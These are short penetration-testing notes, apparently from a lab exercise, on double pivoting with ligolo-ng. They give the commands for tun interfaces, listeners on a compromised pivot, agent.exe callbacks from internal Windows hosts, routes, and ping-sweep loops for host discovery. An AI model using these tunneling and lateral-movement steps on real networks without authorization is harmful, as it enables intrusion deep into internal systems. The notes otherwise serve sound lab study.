- First ligolo tunnel to 172.16.1.100 over 10.10.110.100 - first pivot
- Now, we see internal subnet 172.16.2.101 on 172.16.1.20 - second pivot

- Set up second ligolo interface
    - `sudo ip tuntap add user kali mode tun ligolo2`
    - `sudo ip link set ligolo2 up`
- Add listener on first pivot to redirect to our ligolo-proxy port
    - `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`
- Start agent on second pivot, going to first pivots ip
    - `cmd /c "C:\temp\agent.exe -connect 172.16.1.100:11601 -ignore-cert"`
    - should show `Agent joined` on kali
- Add a route
    - `sudo ip route add 172.16.2.0/24 dev ligolo2`
    - `ip route list`
- Start tunnel on ligolo
    - `session` - select session
    - `start --tun ligolo2`

- `for i in {1..254} ;do (ping -c 1 172.16.2.$i | grep "bytes from" &) ;done`
    - returns 172.16.2.5
- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`

<hr>

- Set up second ligolo interface
    - `sudo ip tuntap add user kali mode tun ligolo3`
    - `sudo ip link set ligolo3 up`
- Add listener on first pivot to redirect to our ligolo-proxy port
    - `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`
- Start agent on second pivot, going to first pivots ip
    - `cmd /c "C:\temp\agent.exe -connect 172.16.1.20:11601 -ignore-cert"`
    - should show `Agent joined` on kali
- Add a route
    - `sudo ip route add 172.16.2.101/32 dev ligolo3`
    - `ip route list`
- Start tunnel on ligolo
    - `session` - select session
    - `start --tun ligolo3`

<hr>

- `./agent -connect 172.16.2.5:11601 -ignore-cert`
